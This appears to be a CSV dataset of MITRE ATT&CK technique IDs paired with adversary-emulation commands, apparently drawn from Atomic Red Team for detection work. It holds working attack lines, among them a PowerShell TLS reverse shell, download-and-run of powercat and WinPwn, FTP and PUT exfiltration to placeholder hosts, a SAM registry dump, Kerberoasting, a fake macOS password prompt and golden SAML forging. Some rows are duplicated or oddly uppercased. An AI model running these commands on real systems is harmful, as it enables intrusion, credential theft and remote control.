mitre_id,command
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
T1497,ping -c #{ping_count} 8.8.8.8 > /dev/null #{evil_command} 
T1048,"$dir_to_copy = ""$env:windir\temp"" $ftp = ""ftp://#{ftp_server}/"" $web_client = new-object system.net.webclient $web_client.credentials = new-object system.net.networkcredential('#{username}', '#{password}') if (test-connection -count 1 -computername ""#{ftp_server}"" -quiet) {foreach($file in (dir $dir_to_copy ""*.7z"")) {echo ""uploading $file..."" $uri = new-object system.uri($ftp+$file.name) $web_client.uploadfile($uri, $file.fullname)}} else {echo ""ftp server unreachable. please verify the server address in input args and try again.""}"
T1566,$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1566.001/bin/phishingattachment.xlsm' [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 invoke-webrequest -uri $url -outfile $env:temp\phishingattachment.xlsm
T1113,xwd -root -out #{output_file} xwud -in #{output_file}
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1558,"add-type -assemblyname system.identitymodel setspn.exe -t #{domain_name} -q */* | select-string '^cn' -context 0,1 | % { new-object system.identitymodel.tokens.kerberosrequestorsecuritytoken -argumentlist $_.context.postcontext[0].trim() }"
T1578,"aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description ""atomic red team test snapshot"" --query ""snapshotid"" --output text # id_6871"
T1216,set comspec=#{command_to_execute} cscript %windir%\system32\manage-bde.wsf
T1095,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1') powercat -c #{server_ip} -p #{server_port}
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"""
T1613,podman build -t t1613 $pathtoatomicsfolder/t1613/src/ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613) # id_2456
T1592,"GET-CIMINSTANCE -QUERY ""SELECT * FROM WIN32_PNPENTITY WHERE (PNPCLASS = 'IMAGE' OR PNPCLASS = 'CAMERA')"""
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1020,"$filename = ""#{file}"" $url = ""#{domain}"" $file = new-item -force $filename -value ""this is art icedid botnet exfil test"" $contenttype = ""application/octet-stream"" try {invoke-webrequest -uri $url -method put -contenttype $contenttype -infile $filename} catch{} # id_3691"
T1133,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1127,"copy ""#{filename}"" %temp%\hello.js #{jscpath}\#{jscname} %temp%\hello.js "
T1543,SUDO CP #{SCRIPT_LOCATION} #{SCRIPT_DESTINATION} SUDO TOUCH /PRIVATE/VAR/DB/EMONDCLIENTS/#{EMPTY_FILE}
T1040,sudo #{program_path} -a -t 3 # id_5239
T1220,"wmic #{wmic_command} /format:""#{local_xsl_file}""   "
T1570,net use * '#{remote_path}' /transport:quic /skipcertcheck copy '#{local_file}' '*:\'
T1140,"mkdir ""#{output_dir}"" >nul 2>&1 echo hello from atomic red team > ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" makecab ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" ""#{cab_path}"" pushd ""#{output_dir}"" expand ""#{cab_path}"" -f:* . popd   "
T1012,reg.exe query hklm\system\currentcontrolset\control /v systemstartoptions
T1129,"#{PSCP_FILE} -PW #{VM_PASS} #{VIB_FILE} #{VM_USER}@#{VM_HOST}:/TMP ECHO """" | ""#{PLINK_FILE}"" ""#{VM_HOST}"" -SSH -L ""#{VM_USER}"" -PW ""#{VM_PASS}"" -M ""#{VIB_INSTALL}"""
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") # id_6843"
T1220,"wmic #{wmic_command} /format:""#{remote_xsl_file}"" "
T1559,"start ""$pathtoatomicsfolder\t1559.002\bin\dde_document.docx"""
T1560,makecab.exe #{input_file} #{output_file}  
T1012,reg.exe query hklm\system\currentcontrolset\control /v systemstartoptions
T1221,"start ""#{docx_file}"""
T1187,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-internalmonologue.ps1') invoke-internalmonologue -command ""-downgrade true -impersonate true -restore true"" # id_3622"
T1003,reg save HKLM\SAM registry.txt
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1119,new-item -path $env:temp\t1119_powershell_collection -itemtype directory -force | out-null get-childitem -recurse -include *.doc | % {copy-item $_.fullname -destination $env:temp\t1119_powershell_collection}
T1055,"start-process ""#{exe_binary}"" start-sleep -seconds 7 get-process -name notepad -erroraction silentlycontinue | stop-process -force"
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region  "
T1201,get-addefaultdomainpasswordpolicy
T1055,"start-process ""#{exe_binary}"" start-sleep -seconds 7 get-process -name notepad -erroraction silentlycontinue | stop-process -force # id_8040"
T1482,"""#{trufflesnout_path}"" forest -n #{domain} ""#{trufflesnout_path}"" domain -n #{domain} # id_2940"
T1197,START-BITSTRANSFER -PRIORITY FOREGROUND -SOURCE #{REMOTE_FILE} -DESTINATION #{LOCAL_FILE}
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"""
T1136,useradd -m -n -r -s /bin/bash -c evil_account #{username}  
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"""
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""   "
T1571,test-netconnection -computername #{domain} -port #{port}   
T1222,chmod -r #{symbolic_mode} #{file_or_folder}  
T1021,"""#{psexec_exe}"" #{remote_host} -accepteula -c #{command_path}"
T1014,"sudo modprobe #{rootkit_name} ping -c 10 localhost >/dev/null & targetpid=""$!"" ps $targetpid kill -31 $targetpid ps $targetpid || echo ""process ${targetpid} hidden"" # id_7075"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)"
T1049,GET-NETTCPCONNECTION
T1074,"invoke-webrequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1074.001/src/discovery.bat"" -outfile #{output_file} # id_2338"
T1115,echo ifconfig | pbcopy $(pbpaste) # id_2315
T1553,iex (iwr 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1553.004/src/remotecerttrust.ps1' -usebasicparsing)  
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"" # id_6201"
T1001,"get-content ""#{image_file}"", ""#{tar_file}"" -encoding byte -readcount 0 | set-content ""#{new_image_file}"" -encoding byte"
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region # id_8597"
T1124,"REG QUERY ""HKLM\SYSTEM\CURRENTCONTROLSET\CONTROL\TIMEZONEINFORMATION"" /V TIMEZONEKEYNAME"
T1056,"PWD_SPOOF=$(OSASCRIPT -E 'DISPLAY DIALOG ""TO PERFORM A SECURITY UPDATE MACOS NEEDS YOUR PASSPHRASE."" WITH TITLE ""MACOS SECURITY UPDATE"" DEFAULT ANSWER """" WITH ICON STOP WITH HIDDEN ANSWER') ECHO $PWD_SPOOF"
T1518,powershell get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct powershell get-wmiobject -namespace root\securitycenter2 -class antivirusproduct 
T1620,IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('HTTPS://RAW.GITHUBUSERCONTENT.COM/S3CUR3TH1SSH1T/WINPWN/121DCEE26A7ACA368821563CBE92B2B5638C5773/WINPWN.PS1') MIMILOAD -CONSOLEOUTPUT -NONINTERACTIVE
T1012,reg query hkcu\software\policies\microsoft\windows\installer /v alwaysinstallelevated reg query hklm\software\policies\microsoft\windows\installer /v alwaysinstallelevated
T1497,"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""virtualization environment detected""; fi  "
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()} # id_5498"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer "
T1526,"IMPORT-MODULE ""PATHTOATOMICSFOLDER\..\EXTERNALPAYLOADS\GET-AZDOMAININFO.PS1"" $PASSWORD = CONVERTTO-SECURESTRING -STRING ""#{PASSWORD}"" -ASPLAINTEXT -FORCE $CREDENTIAL = NEW-OBJECT -TYPENAME SYSTEM.MANAGEMENT.AUTOMATION.PSCREDENTIAL -ARGUMENTLIST ""#{USERNAME}"", $PASSWORD CONNECT-AZACCOUNT -CREDENTIAL $CREDENTIAL | OUT-NULL GET-AZDOMAININFO -FOLDER #{OUTPUT_DIRECTORY} -SUBSCRIPTION ""#{SUBSCRIPTION_NAME}"" -VERBOSE"
T1057,tasklist | findstr #{process_to_enumerate} # id_9347
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1049,if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -np 2>/dev/null || true; fi # id_6464
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"" "
T1105,CURL -SO #{REMOTE_URL}; CHMOD +X #{PAYLOAD_NAME} | BASH #{PAYLOAD_NAME}
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer # id_5528"
T1531,"connect-azuread $userprincipalname = ""#{userprincipalname}"" remove-azureaduser -objectid $userprincipalname   "
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()}  "
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1497,"$manufacturer = get-wmiobject -class win32_computersystem | select-object -expandproperty ""manufacturer"" $model = get-wmiobject -class win32_computersystem | select-object -expandproperty ""model"" if((($manufacturer.tolower() -eq ""microsoft corporation"") -and ($model.tolower().contains(""virtual""))) -or ($manufacturer.tolower().contains(""vmware"")) -or ($model.tolower() -eq ""virtualbox"")) {write-host ""virtualization environment detected!""} else {write-host ""no virtualization environment detected!""} # id_4011"
T1090,networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port} networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port} # id_8697
T1046,"$ipaddr = ""#{ip_address}"" if ($ipaddr -like ""*,*"") { $ip_list = $ipaddr -split "","" $ip_list = $ip_list.foreach({ $_.trim() }) write-host ""[i] ip address list: $ip_list"" $ports = #{port_list} foreach ($ip in $ip_list) { foreach ($port in $ports) { write-host ""[i] establishing connection to: $ip : $port"" try { $tcp = new-object net.sockets.tcpclient $tcp.connectasync($ip, $port).wait(#{timeout_ms}) | out-null } catch {} if ($tcp.connected) { $tcp.close() write-host ""port $port is open on $ip"" } } } } elseif ($ipaddr -notlike ""*,*"") { if ($ipaddr -eq """") { # assumes the ""primary"" interface is shown at the top $interface = get-netipinterface -addressfamily ipv4 -connectionstate connected | select-object -expandproperty interfacealias -first 1 write-host ""[i] using interface $interface"" $ipaddr = get-netipaddress -addressfamily ipv4 -interfacealias $interface | select-object -expandproperty ipaddress } write-host ""[i] base ip-address for subnet: $ipaddr"" $subnetsubstring = $ipaddr.substring(0, $ipaddr.lastindexof('.') + 1) # always assumes /24 subnet write-host ""[i] assuming /24 subnet. scanning $subnetsubstring'1' to $subnetsubstring'254'"" $ports = #{port_list} $subnetips = 1..254 | foreach-object { ""$subnetsubstring$_"" } foreach ($ip in $subnetips) { foreach ($port in $ports) { try { $tcp = new-object net.sockets.tcpclient $tcp.connectasync($ip, $port).wait(#{timeout_ms}) | out-null } catch {} if ($tcp.connected) { $tcp.close() write-host ""port $port is open on $ip"" } } } } else { write-host ""[error] invalid inputs"" exit 1 }"
